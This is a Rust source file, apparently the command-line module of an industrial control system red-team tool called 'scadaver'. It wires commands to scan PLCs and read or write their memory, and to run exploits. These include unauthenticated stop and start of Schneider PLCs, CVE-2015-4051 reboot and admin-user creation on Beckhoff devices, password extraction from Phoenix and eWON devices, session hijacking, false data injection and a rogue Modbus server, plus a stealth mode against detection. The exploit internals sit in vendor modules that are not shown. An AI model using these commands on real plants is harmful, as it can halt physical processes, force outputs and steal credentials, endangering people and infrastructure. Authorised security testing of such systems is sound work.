use anyhow::{bail, Result};
use clap::{Parser, Subcommand, ValueEnum};

// ===================================================================
// CLI definition
// ===================================================================

#[derive(Parser)]
#[command(
    name = "scadaver",
    version = "1.0.0",
    about = "Unified ICS Red Team Multi-Tool (Rust)",
    long_about = None,
)]
pub struct Args {
    /// Target host IP address
    #[arg(short, long, global = true)]
    pub ip: Option<String>,

    /// Override port (0 = protocol default)
    #[arg(short = 'p', long, global = true, default_value = "0")]
    pub port: u16,

    /// Timeout in seconds
    #[arg(short, long, global = true, default_value = "5")]
    pub timeout: u64,

    /// Protocol hint (required for some operations)
    #[arg(long, global = true, value_enum)]
    pub protocol: Option<Protocol>,

    /// Randomise probe order and add inter-probe jitter to reduce scan fingerprint
    #[arg(short = 'z', long, global = true)]
    pub stealth: bool,

    #[command(subcommand)]
    pub command: Option<Verb>,
}

#[derive(Clone, Copy, Debug, ValueEnum)]
pub enum Protocol {
    Beckhoff,
    Siemens,
    Schneider,
    Modbus,
    Rockwell,
    Mitsubishi,
    Omron,
    Phoenix,
    Ewon,
    Snmp,
    Iec104,
    Enip,
}

#[derive(Subcommand)]
pub enum Verb {
    /// Probe for ICS devices (all protocols or --protocol for one; -i for targeted)
    Scan,
    /// Read data from a device (-i required)
    Get {
        #[command(subcommand)]
        noun: GetNoun,
    },
    /// Write data to a device (-i required)
    Set {
        #[command(subcommand)]
        noun: SetNoun,
    },
    /// Execute an exploit or action (-i required)
    Run {
        #[command(subcommand)]
        exploit: RunCmd,
    },
    /// Launch the interactive terminal UI
    Tui,
    /// Start the web interface (browser-based UI)
    Web {
        /// Host to listen on
        #[arg(long, default_value = "127.0.0.1")]
        host: String,
        /// Port to listen on
        #[arg(long, default_value = "8888")]
        port: u16,
    },
    /// Manage the device database
    Db {
        #[command(subcommand)]
        cmd: DbCmd,
    },
}

#[derive(Subcommand)]
pub enum GetNoun {
    /// Device identity and firmware info (--protocol required)
    Info,
    /// CPU run/stop/monitor state (--protocol: siemens | omron | beckhoff)
    State,
    /// Digital inputs, outputs, and merkers (Siemens S7)
    Io {
        #[arg(long)]
        password: Option<String>,
    },
    /// Tag/symbol list (--protocol: rockwell | beckhoff | phoenix)
    Tags,
    /// Read one named tag (--protocol: rockwell | beckhoff)
    Tag {
        name: String,
    },
    /// Holding registers FC3 (Modbus TCP)
    Register {
        #[arg(default_value = "0")]
        start: u16,
        #[arg(default_value = "10")]
        count: u16,
    },
    /// Input registers FC4 (Modbus TCP)
    InputRegister {
        #[arg(default_value = "0")]
        start: u16,
        #[arg(default_value = "10")]
        count: u16,
    },
    /// Coils FC1 (Modbus TCP)
    Coil {
        #[arg(default_value = "0")]
        start: u16,
        #[arg(default_value = "16")]
        count: u16,
    },
    /// DM area words (Omron FINS TCP)
    Dm {
        #[arg(default_value = "0")]
        start: u16,
        #[arg(default_value = "10")]
        count: u16,
    },
    /// S7 Data Block bytes (Siemens)
    Db {
        db: u16,
        #[arg(default_value = "0")]
        offset: u16,
        #[arg(default_value = "16")]
        len: u16,
        #[arg(long)]
        password: Option<String>,
    },
    /// D word registers (Mitsubishi SLMP)
    D {
        #[arg(default_value = "0")]
        start: u32,
        #[arg(default_value = "10")]
        count: u16,
    },
    /// M bit devices (Mitsubishi SLMP)
    M {
        #[arg(default_value = "0")]
        start: u32,
        #[arg(default_value = "16")]
        count: u16,
    },
    /// Probe SNMP community strings
    Community,
    /// SNMP GET a single OID
    Oid {
        oid: String,
        #[arg(short, long, default_value = "public")]
        community: String,
    },
    /// SNMP GETNEXT walk an OID subtree
    Walk {
        oid: String,
        #[arg(short, long, default_value = "public")]
        community: String,
    },
    /// SNMP system info, interfaces, and topology
    Enum {
        #[arg(short, long, default_value = "public")]
        community: String,
    },
    /// IEC 60870-5-104 General Interrogation
    Gi,
    /// eWON credential store (auth bypass)
    Creds {
        #[arg(long, default_value = "20")]
        max_users: u32,
    },
    /// Schneider legacy web-session compatibility check (advisory mapping unverified)
    Session,
}

#[derive(Subcommand)]
pub enum SetNoun {
    /// CPU state: run | stop | monitor | config | flip  (--protocol required)
    State {
        state: String,
    },
    /// Write one tag  NAME=HEXBYTES  (--protocol: rockwell | beckhoff | phoenix)
    Tag {
        /// NAME=HEXVALUE, e.g. MAIN.valve=01
        assignment: String,
    },
    /// Write a Modbus holding register FC6
    Register {
        address: u16,
        value: u16,
    },
    /// Write multiple Modbus holding registers FC16
    Registers {
        start: u16,
        /// Comma-separated u16 values
        values: String,
    },
    /// Write a Modbus coil FC5
    Coil {
        address: u16,
        /// on | off
        state: String,
    },
    /// Write Siemens S7 digital outputs (binary string)
    Output {
        bits: String,
        #[arg(long)]
        password: Option<String>,
    },
    /// Write Siemens S7 merkers (bits[,byte-offset])
    Merkers {
        bits_offset: String,
        #[arg(long)]
        password: Option<String>,
    },
    /// Write DM area words (Omron FINS)
    Dm {
        start: u16,
        /// Comma-separated u16 values
        values: String,
    },
    /// Write Siemens S7 Data Block bytes
    Db {
        db: u16,
        #[arg(default_value = "0")]
        offset: u16,
        /// Hex data string, e.g. deadbeef
        data: String,
        #[arg(long)]
        password: Option<String>,
    },
    /// Write D word registers (Mitsubishi SLMP)
    D {
        start: u32,
        /// Comma-separated u16 values
        values: String,
    },
    /// Write M bit devices (Mitsubishi SLMP)
    M {
        start: u32,
        /// Binary string of 0/1 bits
        bits: String,
    },
    /// SNMP SET an OID value (--confirm required)
    Oid {
        oid: String,
        value: String,
        #[arg(long)]
        community: String,
        #[arg(long, default_value = "str")]
        r#type: String,
        #[arg(long)]
        confirm: bool,
    },
    /// IEC 60870-5-104 Single Command (on | off)
    Sc {
        ioa: u32,
        /// on | off
        state: String,
    },
    /// IEC 60870-5-104 Double Command (state: 1=off 2=on 3=indeterminate)
    Dc {
        ioa: u32,
        #[arg(default_value = "2")]
        state: u8,
    },
}

#[derive(Subcommand)]
pub enum RunCmd {
    /// CVE-2015-4051: Reboot Beckhoff CX9020 via UPnP/SOAP
    Reboot,
    /// CVE-2015-4051: Add admin user to Beckhoff CX9020
    AddUser {
        /// username:password
        credentials: String,
    },
    /// CVE-2015-4051: Write raw bytes to a Beckhoff ADS symbol
    WriteSymbol {
        /// SymbolName=hexbytes, e.g. MAIN.valve=01
        input: String,
    },
    /// Flash identification LED on Schneider PLC
    FlashLed,
    /// Stop a Schneider lab fixture via a recovered legacy web session
    SessionStop,
    /// Start a Schneider lab fixture via a recovered legacy web session
    SessionRun,
    /// FC90: Unauthenticated stop (--model tm221 for TM221, default m340)
    Fc90Stop {
        #[arg(long, default_value = "m340")]
        model: String,
    },
    /// FC90: Unauthenticated start (--model tm221 for TM221, default m340)
    Fc90Start {
        #[arg(long, default_value = "m340")]
        model: String,
    },
    /// FC90: Force output bit on Schneider M340
    Fc90Force {
        #[arg(long, default_value = "0x11")]
        output: String,
        #[arg(long, default_value = "on")]
        state: String,
    },
    /// CVE-2016-8366: Retrieve passwords from Phoenix `WebVisit` HMI
    Passwords,
    /// eWON auth bypass: extract credential store
    EwonCreds {
        #[arg(long, default_value = "20")]
        max_users: u32,
    },
    /// OT network port scanner: TCP connect scan for common ICS/SCADA ports
    Portscan {
        /// Additional ports to scan (comma-separated, e.g. "8888,9999")
        #[arg(long)]
        ports: Option<String>,
    },
    /// CVE-2014-6271 Shellshock scanner: test CGI endpoints on PLC/HMI web servers
    Shellshock {
        /// HTTP port of the target web server
        #[arg(long, default_value = "80")]
        http_port: u16,
    },
    /// HTTP Basic Auth default-credential tester for ICS web interfaces
    DefaultCreds {
        /// URL path to authenticate against (default: /)
        #[arg(long, default_value = "/")]
        path: String,
        /// HTTP port of the target web server
        #[arg(long, default_value = "80")]
        http_port: u16,
    },
    /// False Data Injection: continuously write a forged Modbus value (SCASS §6.3.1)
    Fdi {
        /// Modbus address to write (0-based)
        #[arg(long)]
        address: u16,
        /// Value to inject (u16; for coils: 0=OFF, 1=ON)
        #[arg(long)]
        value: u16,
        /// Target type: register | coil
        #[arg(long, default_value = "register")]
        target: String,
        /// Seconds between writes
        #[arg(long, default_value = "2")]
        interval: u64,
        /// Stop after N writes (0 = run until Ctrl-C)
        #[arg(long, default_value = "0")]
        count: u64,
    },
    /// Rogue Modbus TCP server: impersonate a slave with configurable fixed responses
    ModbusServer {
        /// TCP port to listen on
        #[arg(long, default_value = "502")]
        port: u16,
        /// Value returned for all FC3 holding-register reads
        #[arg(long, default_value = "0")]
        reg_value: u16,
        /// Value returned for all FC1 coil reads (0=OFF, 1=ON)
        #[arg(long, default_value = "0")]
        coil_value: u8,
    },
}

#[derive(Subcommand)]
pub enum DbCmd {
    /// Add a device to the database
    Add {
        #[arg(long)]
        ip: String,
        #[arg(long)]
        vendor: Option<String>,
    },
    /// Remove a device by database ID
    Remove {
        #[arg(long)]
        id: i64,
    },
    /// List ICS research references from awesome-ics-writeups (optionally filtered by vendor)
    Refs {
        /// Vendor slug: beckhoff, siemens, schneider, rockwell, mitsubishi, omron,
        /// phoenix, ewon, modbus, iec104, enip, snmp, malware, ics-general, general
        vendor: Option<String>,
    },
}

// ===================================================================
// Public entrypoint
// ===================================================================

pub fn run(args: Args) -> Result<()> {
    crate::display::print_banner();
    if args.stealth {
        crate::core::autodetect::set_stealth(true);
    }
    let Some(command) = args.command else { return Ok(()); };
    match command {
        Verb::Tui | Verb::Web { .. } => Ok(()), // handled in main.rs before cli::run is called
        Verb::Db { cmd } => run_db(cmd),
        Verb::Scan => run_scan(args.ip.as_deref(), args.port, args.timeout, args.protocol),
        Verb::Get { noun } => {
            let ip = require_ip(args.ip.as_ref(), "get")?;
            run_get(ip, args.port, args.timeout, args.protocol, noun)
        }
        Verb::Set { noun } => {
            let ip = require_ip(args.ip.as_ref(), "set")?;
            run_set(ip, args.port, args.timeout, args.protocol, noun)
        }
        Verb::Run { exploit } => match exploit {
            // ModbusServer binds locally: no target IP needed.
            RunCmd::ModbusServer { port, reg_value, coil_value } => {
                crate::core::modbus_server::serve(port, reg_value, coil_value == 1)
            }
            other => {
                let ip = require_ip(args.ip.as_ref(), "run")?;
                run_run(ip, args.port, args.timeout, other)
            }
        }
    }
}

fn require_ip<'a>(ip: Option<&'a String>, verb: &str) -> Result<&'a str> {
    ip.map(String::as_str)
        .ok_or_else(|| anyhow::anyhow!("'-i <IP>' is required for '{verb}'"))
}

// ===================================================================
// Scan
// ===================================================================

fn run_scan(ip: Option<&str>, port: u16, timeout: u64, protocol: Option<Protocol>) -> Result<()> {
    match (ip, protocol) {
        (Some(ip), None) => { scan_auto(ip, timeout); Ok(()) }
        (Some(ip), Some(proto)) => scan_targeted(ip, port, timeout, proto),
        (None, Some(proto)) => scan_broadcast(proto, timeout),
        (None, None) => bail!("'-i <IP>' or '--protocol <PROTO>' required for scan"),
    }
}

fn scan_auto(ip: &str, timeout: u64) {
    use colored::Colorize;
    crate::display::print_info(&format!("Scanning {ip} across all protocols…"));
    println!();
    let outcomes = crate::core::autodetect::sweep(ip, timeout);
    for outcome in &outcomes {
        let (tag, detail) = match &outcome.device {
            Some(dev) => ("[+]".green().bold(), summarize_device(dev).normal()),
            None => ("[-]".yellow().bold(), "no response".dimmed()),
        };
        println!(
            "{tag} {:<18} {:<22} {detail}",
            outcome.probe.label, outcome.probe.transport
        );
    }
    let responded = outcomes.iter().filter(|o| o.device.is_some()).count();
    println!();
    crate::display::print_success(&format!(
        "{responded}/{} protocol(s) responded.",
        outcomes.len()
    ));
}

fn scan_broadcast(proto: Protocol, timeout: u64) -> Result<()> {
    use crate::core::network::{get_interfaces, select_interface};
    match proto {
        Protocol::Enip => {
            let ifaces = get_interfaces();
            let iface = select_interface(&ifaces)?;
            let devs = crate::vendors::enip::scan::scan(&iface, timeout, false)?;
            crate::display::print_success(&format!("Found {} EtherNet/IP device(s).", devs.len()));
        }
        Protocol::Ewon => {
            let ifaces = get_interfaces();
            let iface = select_interface(&ifaces)?;
            let devs = crate::vendors::ewon::scan::scan(&iface, timeout, false)?;
            crate::display::print_success(&format!("Found {} eWON response(s).", devs.len()));
        }
        Protocol::Schneider => {
            let ifaces = get_interfaces();
            let iface = select_interface(&ifaces)?;
            let devs = crate::vendors::schneider::scan::scan(&iface, timeout, false)?;
            crate::display::print_success(&format!("Found {} Schneider device(s).", devs.len()));
        }
        Protocol::Mitsubishi => {
            let ifaces = get_interfaces();
            let iface = select_interface(&ifaces)?;
            let devs = crate::vendors::mitsubishi::scan::scan(&iface, timeout, false)?;
            crate::display::print_success(&format!("Found {} Mitsubishi device(s).", devs.len()));
        }
        Protocol::Beckhoff => {
            let ifaces = get_interfaces();
            let iface = select_interface(&ifaces)?;
            let devs = crate::vendors::beckhoff::scan::discover(&iface, timeout, false)?;
            crate::display::print_success(&format!("Found {} Beckhoff device(s).", devs.len()));
        }
        p => bail!("{p:?} does not support broadcast scan: provide '-i <IP>'"),
    }
    Ok(())
}

fn scan_targeted(ip: &str, port: u16, timeout: u64, proto: Protocol) -> Result<()> {
    match proto {
        Protocol::Enip => {
            let devs = crate::vendors::enip::scan::scan_ip(ip, timeout, false)?;
            if devs.is_empty() {
                crate::display::print_warn("No EtherNet/IP response.");
            }
        }
        Protocol::Ewon => {
            let devs = crate::vendors::ewon::scan::scan_ip(ip, timeout, false)?;
            if devs.is_empty() {
                crate::display::print_warn("No eWON response.");
            }
        }
        Protocol::Schneider => {
            let devs = crate::vendors::schneider::scan::scan_ip_with_transport(
                ip,
                timeout,
                false,
                port,
                crate::vendors::schneider::scan::Transport::Both,
            )?;
            if devs.is_empty() {
                crate::display::print_warn("No Schneider response.");
            }
        }
        Protocol::Mitsubishi => {
            let devs = crate::vendors::mitsubishi::scan::scan_ip_with_transport(
                ip,
                timeout,
                false,
                port,
                crate::vendors::mitsubishi::scan::Transport::Both,
            )?;
            if devs.is_empty() {
                crate::display::print_warn("No Mitsubishi MELSEC response.");
            }
        }
        Protocol::Beckhoff => {
            let devs =
                crate::vendors::beckhoff::scan::discover_ip_with_port(ip, timeout, false, port)?;
            if devs.is_empty() {
                crate::display::print_warn("No Beckhoff TwinCAT response.");
            }
        }
        Protocol::Siemens => {
            use crate::vendors::siemens::scan;
            let dev = scan::scan_ip_with_port(ip, if port == 0 { 102 } else { port });
            println!("  IP:       {}", dev.ip);
            if let Some(hw) = &dev.hardware {
                println!("  Hardware: {hw}");
            }
            if let Some(fw) = &dev.firmware {
                println!("  Firmware: {fw}");
            }
            if let Some(cs) = &dev.cpu_state {
                println!("  CPU:      {cs}");
            }
            if !dev.open_ports.is_empty() {
                let ports: Vec<String> =
                    dev.open_ports.iter().map(ToString::to_string).collect();
                println!("  Ports:    {}", ports.join(", "));
            }
        }
        Protocol::Snmp => {
            use crate::vendors::snmp::{client, oids};
            let snmp_port = if port == 0 { 161 } else { port };
            let pb =
                crate::display::spinner_start(&format!("Scanning SNMP communities on {ip}…"));
            let mut found = Vec::new();
            for &c in oids::COMMON_COMMUNITIES {
                if let Ok(val) = client::get(ip, snmp_port, c, oids::SYS_DESCR) {
                    found.push((c, val.display()));
                }
            }
            pb.finish_and_clear();
            if found.is_empty() {
                crate::display::print_warn("No SNMP community strings responded.");
            } else {
                for (c, descr) in &found {
                    println!("  community={c:<12}  sysDescr={descr}");
                }
                crate::display::print_success(&format!(
                    "{} community string(s) found.",
                    found.len()
                ));
            }
        }
        p => {
            crate::display::print_info(&format!(
                "Use 'get info --protocol {p:?}' for device details."
            ));
        }
    }
    Ok(())
}

// ===================================================================
// Get
// ===================================================================

#[allow(clippy::too_many_lines)]
fn run_get(
    ip: &str,
    port: u16,
    timeout: u64,
    protocol: Option<Protocol>,
    noun: GetNoun,
) -> Result<()> {
    match noun {
        GetNoun::Info => get_info(ip, port, timeout, protocol),
        GetNoun::State => get_state(ip, port, timeout, protocol),
        GetNoun::Io { password } => { get_io(ip, port, password.as_deref()); Ok(()) }
        GetNoun::Tags => get_tags(ip, port, timeout, protocol),
        GetNoun::Tag { name } => get_tag(ip, port, timeout, &name, protocol),
        GetNoun::Register { start, count } => {
            use crate::vendors::schneider::modbus;
            crate::display::print_info(&format!(
                "Reading {count} holding registers from {ip} (start={start})…"
            ));
            match modbus::read_holding_registers(ip, port, start, count) {
                Ok(regs) => {
                    for r in &regs {
                        println!("  {:>6}  {}", r.display_addr, r.value_str);
                    }
                    crate::display::print_success(&format!("{} register(s) read.", regs.len()));
                }
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
            Ok(())
        }
        GetNoun::InputRegister { start, count } => {
            use crate::vendors::schneider::modbus;
            crate::display::print_info(&format!(
                "Reading {count} input registers from {ip} (start={start})…"
            ));
            match modbus::read_input_registers(ip, port, start, count) {
                Ok(regs) => {
                    for r in &regs {
                        println!("  {:>6}  {}", r.display_addr, r.value_str);
                    }
                    crate::display::print_success(&format!("{} register(s) read.", regs.len()));
                }
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
            Ok(())
        }
        GetNoun::Coil { start, count } => {
            use crate::vendors::schneider::modbus;
            crate::display::print_info(&format!(
                "Reading {count} coils from {ip} (start={start})…"
            ));
            match modbus::read_coils(ip, port, start, count) {
                Ok(regs) => {
                    for r in &regs {
                        println!("  {:>6}  {}", r.display_addr, r.value_str);
                    }
                    crate::display::print_success(&format!("{} coil(s) read.", regs.len()));
                }
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
            Ok(())
        }
        GetNoun::Dm { start, count } => {
            use crate::vendors::omron::fins;
            let fins_port = if port == 0 { 9600 } else { port };
            let pb = crate::display::spinner_start(&format!(
                "Reading DM{start}..DM{} from {ip}…",
                start + count - 1
            ));
            let result = fins::read_dm_words(ip, fins_port, 0, start, count);
            pb.finish_and_clear();
            match result {
                Ok(vals) => {
                    println!("  {:<8}  {:<8}  Hex", "Address", "Dec");
                    for (i, &v) in vals.iter().enumerate() {
                        println!(
                            "  DM{:<6}  {:<8}  {v:#06x}",
                            start + u16::try_from(i).unwrap_or(u16::MAX),
                            v
                        );
                    }
                    crate::display::print_success(&format!("{} word(s).", vals.len()));
                }
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
            Ok(())
        }
        GetNoun::Db {
            db,
            offset,
            len,
            password,
        } => {
            use crate::vendors::siemens::s7comm;
            let s7_port = if port == 0 { 102 } else { port };
            let pb = crate::display::spinner_start(&format!(
                "Reading DB{db}:{offset}+{len} from {ip}…"
            ));
            let result = s7comm::read_data_block(ip, db, offset, len, s7_port, 5, password.as_deref());
            pb.finish_and_clear();
            match result {
                Ok(bytes) => {
                    for (i, chunk) in bytes.chunks(16).enumerate() {
                        let hex: String = chunk
                            .iter()
                            .map(|b| format!("{b:02x}"))
                            .collect::<Vec<_>>()
                            .join(" ");
                        println!("  {:04x}  {hex}", offset as usize + i * 16);
                    }
                    crate::display::print_success(&format!("{} byte(s) from DB{db}.", bytes.len()));
                }
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
            Ok(())
        }
        GetNoun::D { start, count } => {
            use crate::vendors::mitsubishi::slmp;
            let slmp_port = if port == 0 { 5007 } else { port };
            crate::display::print_info(&format!(
                "Reading {count} D register(s) from {ip} starting at D{start}…"
            ));
            match slmp::read_word_devices(ip, slmp_port, "D", start, count) {
                Ok(values) => {
                    for value in &values {
                        println!("  {:>8}  {}", value.display, value.value_str);
                    }
                    crate::display::print_success(&format!("{} D register(s) read.", values.len()));
                }
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
            Ok(())
        }
        GetNoun::M { start, count } => {
            use crate::vendors::mitsubishi::slmp;
            let slmp_port = if port == 0 { 5007 } else { port };
            crate::display::print_info(&format!(
                "Reading {count} M bit(s) from {ip} starting at M{start}…"
            ));
            match slmp::read_bit_devices(ip, slmp_port, "M", start, count) {
                Ok(values) => {
                    for value in &values {
                        println!("  {:>8}  {}", value.display, value.value_str);
                    }
                    crate::display::print_success(&format!("{} M bit(s) read.", values.len()));
                }
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
            Ok(())
        }
        GetNoun::Community => {
            use crate::vendors::snmp::{client, oids};
            let snmp_port = if port == 0 { 161 } else { port };
            let pb = crate::display::spinner_start(&format!("Scanning communities on {ip}…"));
            let mut found = Vec::new();
            for &c in oids::COMMON_COMMUNITIES {
                if let Ok(val) = client::get(ip, snmp_port, c, oids::SYS_DESCR) {
                    found.push((c, val.display()));
                }
            }
            pb.finish_and_clear();
            if found.is_empty() {
                crate::display::print_warn("No community strings responded.");
            } else {
                for (c, descr) in &found {
                    println!("  community={c:<12}  sysDescr={descr}");
                }
                crate::display::print_success(&format!(
                    "{} community string(s) found.",
                    found.len()
                ));
            }
            Ok(())
        }
        GetNoun::Oid { oid, community } => {
            use crate::vendors::snmp::client;
            let snmp_port = if port == 0 { 161 } else { port };
            let val = client::get(ip, snmp_port, &community, &oid)?;
            println!("  {oid} = {}", val.display());
            Ok(())
        }
        GetNoun::Walk { oid, community } => {
            use crate::vendors::snmp::client;
            let snmp_port = if port == 0 { 161 } else { port };
            let pb = crate::display::spinner_start(&format!("Walking {oid} on {ip}…"));
            let entries = client::walk(ip, snmp_port, &community, &oid)?;
            pb.finish_and_clear();
            if entries.is_empty() {
                crate::display::print_warn("No results (end of MIB or wrong community).");
            } else {
                for (o, v) in &entries {
                    println!("  {o} = {}", v.display());
                }
                crate::display::print_success(&format!("{} object(s).", entries.len()));
            }
            Ok(())
        }
        GetNoun::Enum { community } => {
            use crate::vendors::snmp::enumerate;
            let snmp_port = if port == 0 { 161 } else { port };
            let pb = crate::display::spinner_start(&format!("Enumerating {ip}…"));
            let info = enumerate::get_system_info(ip, snmp_port, &community)?;
            let ifaces =
                enumerate::get_interfaces(ip, snmp_port, &community).unwrap_or_default();
            let topo = enumerate::get_topology(ip, snmp_port, &community).unwrap_or_default();
            pb.finish_and_clear();
            println!("  sysDescr:   {}", info.descr);
            println!("  sysOID:     {}", info.object_id);
            println!("  sysName:    {}", info.name);
            println!("  sysContact: {}", info.contact);
            println!("  sysLocatn:  {}", info.location);
            println!("  Uptime:     {}s", info.uptime_secs);
            if let Some(v) = info.ics_vendor {
                println!("  ICS Vendor: {v}");
            }
            if info.is_apc_ups {
                println!("  APC UPS:    yes");
            }
            if !ifaces.is_empty() {
                println!("\n  Interfaces:");
                for i in &ifaces {
                    let state = if i.oper_up { "up" } else { "DOWN" };
                    println!(
                        "    [{:>2}] {:<16} {} {:<5}  {}Mbps  err in:{} out:{}",
                        i.index,
                        i.descr,
                        i.mac,
                        state,
                        i.speed_mbps,
                        i.in_errors,
                        i.out_errors
                    );
                }
            }
            for line in &topo {
                println!("{line}");
            }
            let cves = enumerate::check_cves(&info);
            if !cves.is_empty() {
                println!("\n  CVE / advisory matches:");
                for c in &cves {
                    println!("    [{}] CVSS:{} {}", c.id, c.cvss, c.summary);
                }
            }
            crate::display::print_success("Enumeration complete.");
            Ok(())
        }
        GetNoun::Gi => {
            use crate::vendors::iec104::client;
            let iec_port = if port == 0 { 2404 } else { port };
            let pb =
                crate::display::spinner_start(&format!("Connecting to IEC 104 at {ip}…"));
            let result = client::connect(ip, iec_port);
            pb.finish_and_clear();
            match result {
                Ok(mut sess) => {
                    crate::display::print_success("STARTDT confirmed.");
                    match client::general_interrogation(&mut sess) {
                        Ok(objs) => {
                            for obj in &objs {
                                println!(
                                    "  IOA {:>6}: type=0x{:02x} value={}",
                                    obj.ioa, obj.type_id, obj.decoded
                                );
                            }
                            crate::display::print_success(&format!(
                                "{} object(s).",
                                objs.len()
                            ));
                        }
                        Err(e) => crate::display::print_error(&format!("GI failed: {e}")),
                    }
                }
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
            Ok(())
        }
        GetNoun::Creds { max_users } => {
            use crate::vendors::ewon::exploit;
            crate::display::print_info(&format!("Extracting credentials from {ip}…"));
            let users = exploit::exploit(ip, port, "adm", max_users);
            if users.is_empty() {
                crate::display::print_warn("No credentials extracted.");
            } else {
                crate::display::print_success(&format!(
                    "Extracted {} credential(s).",
                    users.len()
                ));
            }
            Ok(())
        }
        GetNoun::Session => {
            use crate::vendors::schneider::session_hijack;
            let pb =
                crate::display::spinner_start(&format!("Fetching session from {ip}…"));
            let session = session_hijack::get_session_cookie(ip, port);
            pb.finish_and_clear();
            let Some(session) = session else {
                crate::display::print_error("Failed to get session cookie.");
                return Ok(());
            };
            crate::display::print_success(&format!(
                "Cookie: {} (booted {} times)",
                session.cookie_value, session.power_on_count
            ));
            session_hijack::get_device_info(ip, port, &session.cookie_value, "Administrator");
            Ok(())
        }
    }
}

fn get_info(ip: &str, port: u16, timeout: u64, proto: Option<Protocol>) -> Result<()> {
    match proto {
        Some(Protocol::Siemens) => {
            use crate::vendors::siemens::scan;
            let dev = scan::scan_ip_with_port(ip, if port == 0 { 102 } else { port });
            println!("  IP:       {}", dev.ip);
            if let Some(hw) = &dev.hardware {
                println!("  Hardware: {hw}");
            }
            if let Some(fw) = &dev.firmware {
                println!("  Firmware: {fw}");
            }
            if let Some(cs) = &dev.cpu_state {
                println!("  CPU:      {cs}");
            }
        }
        Some(Protocol::Rockwell) => {
            use crate::vendors::rockwell::driver;
            let enip_port = if port == 0 { 44818 } else { port };
            let pb = crate::display::spinner_start(&format!("Connecting to {ip}…"));
            let result = driver::get_device_info(ip, enip_port);
            pb.finish_and_clear();
            match result {
                Ok(dev) => {
                    println!("  Vendor:       {}", dev.vendor);
                    println!("  Product Type: {}", dev.product_type);
                    println!("  Product Code: {}", dev.product_code);
                    println!("  Product Name: {}", dev.product_name);
                    println!("  Revision:     {}", dev.revision);
                    println!("  Serial:       {}", dev.serial);
                }
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
        Some(Protocol::Beckhoff) => {
            use crate::vendors::beckhoff::{ads, scan};
            let local_ip = local_ip_for(ip);
            let local_netid = ads::build_local_netid(&local_ip);
            let pb = crate::display::spinner_start(&format!("Discovering {ip}…"));
            let devs =
                scan::discover_ip_with_port(ip, timeout, false, port).unwrap_or_default();
            pb.finish_and_clear();
            let Some(dev) = devs.into_iter().next() else {
                crate::display::print_error("No Beckhoff device found.");
                return Ok(());
            };
            let pb2 = crate::display::spinner_start("Reading full device info…");
            let result = scan::get_device_info_full(&dev, &local_netid, port);
            pb2.finish_and_clear();
            match result {
                Some(info) => {
                    println!("  Name:    {}", info.name);
                    println!("  NetID:   {}", info.netid);
                    if let Some(os) = &info.os_name {
                        println!("  OS:      {os}");
                    }
                    println!("  TwinCAT: {}", info.tc_version);
                }
                None => crate::display::print_warn("Could not retrieve full device info."),
            }
        }
        Some(Protocol::Omron) => {
            use crate::vendors::omron::fins;
            let fins_port = if port == 0 { 9600 } else { port };
            let pb =
                crate::display::spinner_start(&format!("Querying Omron FINS at {ip}…"));
            let result = fins::get_device_info_tcp(ip, fins_port);
            pb.finish_and_clear();
            match result {
                Ok(dev) => {
                    println!("  Model:   {}", dev.model);
                    println!("  Version: {}", dev.version);
                    println!("  Node:    0x{:02x}", dev.node_addr);
                }
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
        Some(Protocol::Phoenix) => {
            use crate::vendors::phoenix::control;
            let pb = crate::display::spinner_start(&format!("Querying {ip}…"));
            let result = control::get_device_info(ip, port, false);
            pb.finish_and_clear();
            match result {
                Ok(info) => {
                    println!("  PLC Type: {}", info.plc_type);
                    if let Some(fw) = info.firmware {
                        println!("  Firmware: {fw}");
                    }
                    if let Some(b) = info.build {
                        println!("  Build:    {b}");
                    }
                }
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
        Some(p) => bail!("{p:?} does not support 'get info'"),
        None => bail!("'--protocol <PROTO>' required for 'get info'"),
    }
    Ok(())
}

fn get_state(ip: &str, port: u16, _timeout: u64, proto: Option<Protocol>) -> Result<()> {
    match proto {
        Some(Protocol::Siemens) => {
            use crate::vendors::siemens::s7comm;
            let s7_port = if port == 0 { 102 } else { port };
            let state = s7comm::get_cpu_state(ip, s7_port, 5, None);
            crate::display::print_info(&format!("CPU state: {state}"));
        }
        Some(Protocol::Omron) => {
            use crate::vendors::omron::fins;
            let fins_port = if port == 0 { 9600 } else { port };
            match fins::get_cpu_state(ip, fins_port, 0) {
                Ok(state) => crate::display::print_success(&format!("CPU state: {state}")),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
        Some(Protocol::Beckhoff) => {
            use crate::vendors::beckhoff::{ads, scan};
            let local_netid = ads::build_local_netid(&local_ip_for(ip));
            let devs =
                scan::discover_ip_with_port(ip, 3, true, port).unwrap_or_default();
            let Some(dev) = devs.into_iter().next() else {
                crate::display::print_error("No Beckhoff device found.");
                return Ok(());
            };
            let result = scan::get_device_info_full(&dev, &local_netid, port);
            match result {
                Some(info) => println!("  TwinCAT: {}", info.tc_version),
                None => crate::display::print_warn("Could not read TwinCAT state."),
            }
        }
        Some(p) => bail!("{p:?} does not support 'get state'"),
        None => bail!("'--protocol <PROTO>' required for 'get state'"),
    }
    Ok(())
}

fn get_io(ip: &str, port: u16, password: Option<&str>) {
    use crate::vendors::siemens::s7comm;
    let s7_port = if port == 0 { 102 } else { port };
    let pb = crate::display::spinner_start(&format!("Reading I/O from {ip}…"));
    let data = s7comm::read_all_data(ip, s7_port, 5, password);
    pb.finish_and_clear();
    let mut any = false;
    for area in &["inputs", "outputs", "merkers"] {
        if let Some(Some(bits)) = data.get(*area) {
            any = true;
            println!("  {area}:");
            let mut keys: Vec<&String> = bits.keys().collect();
            keys.sort();
            for bit in keys {
                println!("    {bit}: {}", bits[bit]);
            }
        }
    }
    if !any {
        crate::display::print_warn("No I/O data received.");
    }
}

fn get_tags(ip: &str, port: u16, _timeout: u64, proto: Option<Protocol>) -> Result<()> {
    match proto {
        Some(Protocol::Rockwell) => {
            use crate::vendors::rockwell::driver;
            let enip_port = if port == 0 { 44818 } else { port };
            let pb =
                crate::display::spinner_start(&format!("Enumerating tags on {ip}…"));
